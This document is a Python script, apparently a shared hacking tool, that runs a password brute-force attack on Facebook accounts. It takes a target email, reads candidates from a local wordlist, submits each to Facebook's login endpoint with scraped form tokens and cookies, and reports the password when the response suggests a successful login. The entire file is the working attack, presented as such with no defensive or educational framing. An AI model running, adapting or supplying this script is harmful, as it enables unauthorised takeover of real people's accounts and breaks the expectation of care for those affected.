import os
import requests
from bs4 import BeautifulSoup
import sys

def banner():
    print("\033[1;95m                                                                                                                  \033[0m\033[1;91m\033[0m")
    print("\033[1;95m                                                      ███╗   ███╗ █████╗ ██████╗ ██╗██████╗                       \033[0m\033[1;91m\033[0m")
    print("\033[1;95m                                                      ████╗ ████║██╔══██╗██   █╗ ██║██╔══██╗                      \033[0m\033[1;91m\033[0m")
    print("\033[1;95m                                                      ██╔████╔██║███████║█████║  ██║██║  ██║                      \033[0m\033[1;91m\033[0m")
    print("\033[1;95m                                                      ██║╚██╔╝██║██╔══██║██║  █╗ ██║██║  ██║                      \033[0m\033[1;91m\033[0m")
    print("\033[1;95m                                                      ██║ ╚═╝ ██║██║  ██║██   ██ ██║██████╔╝                      \033[0m\033[1;91m\033[0m")
    print("\033[1;95m                                                      ╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝╚═════╝                       \033[0m\033[1;91m\033[0m")
    print("\033[1;77m\033[41m  CRACKED \033[0m")
    print("\033[1;77m\033[41m  Creado por Mario \033[0m")
    print("\n")

if sys.version_info[0] != 3:
    print('''\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 fb.py\n\t--------------------------------------''')
    sys.exit()

PASSWORD_FILE = "passwords.txt"
MIN_PASSWORD_LENGTH = 6
POST_URL = 'https://www.facebook.com/login.php'
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}
PAYLOAD = {}
COOKIES = {}

def create_form():
    form = dict()
    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}

    data = requests.get(POST_URL, headers=HEADERS)
    for i in data.cookies:
        cookies[i.name] = i.value
    data = BeautifulSoup(data.text, 'html.parser').form
    if data.input['name'] == 'lsd':
        form['lsd'] = data.input['value']
    return form, cookies

def is_this_a_password(email, index, password):
    global PAYLOAD, COOKIES
    if index % 10 == 0:
        PAYLOAD, COOKIES = create_form()
        PAYLOAD['email'] = email
    PAYLOAD['pass'] = password
    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
        open('temp', 'w').write(str(r.content))
        print('\npassword found is: ', password)
        return True
    return False

if __name__ == "__main__":
    banner()
    print('\n---------- Welcome To A BruteForce Facebook attack ----------\n')
    print('---------- Thank our @Whoam4 for this tool! ----------\n')

    current_dir = os.path.dirname(os.path.abspath(__file__))
    password_file_path = os.path.join(current_dir, PASSWORD_FILE)
    print("Current working directory:", current_dir)

    if not os.path.isfile(password_file_path):
        print("Password file does not exist:", password_file_path)
        sys.exit(0)

    password_data = open(password_file_path, 'r').read().split("\n")
    print("Password file selected:", password_file_path)
    email = input('Enter Email/Username to target: ').strip()

    for index, password in zip(range(password_data.__len__()), password_data):
        password = password.strip()
        if len(password) < MIN_PASSWORD_LENGTH:
            continue
        print("Trying password [", index, "]: ", password)
        if is_this_a_password(email, index, password):
            break
